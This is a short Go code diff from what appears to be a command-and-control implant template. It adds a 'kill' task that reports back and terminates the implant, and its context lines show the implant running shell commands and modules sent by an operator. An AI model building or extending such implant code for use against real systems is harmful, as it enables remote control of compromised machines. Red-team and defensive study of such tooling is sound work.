@@ -841,6 +841,16 @@ func executeTask(task map[string]interface{}) {
 		if cmd, ok := task["command"].(string); ok {
 			executeShellCommand(taskID, cmd)
 		}
+	case "kill":
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] Kill command received, terminating implant...\n")
+		{{end}}
+		// Send result before exiting (best effort)
+		sendResult("kill", taskID, "Implant terminating...")
+		// Give a moment for result to be sent
+		time.Sleep(500 * time.Millisecond)
+		// Terminate the implant process
+		os.Exit(0)
 	case "module":
 		if moduleID, ok := task["module_id"].(string); ok {
 			executeModule(taskID, moduleID, task)
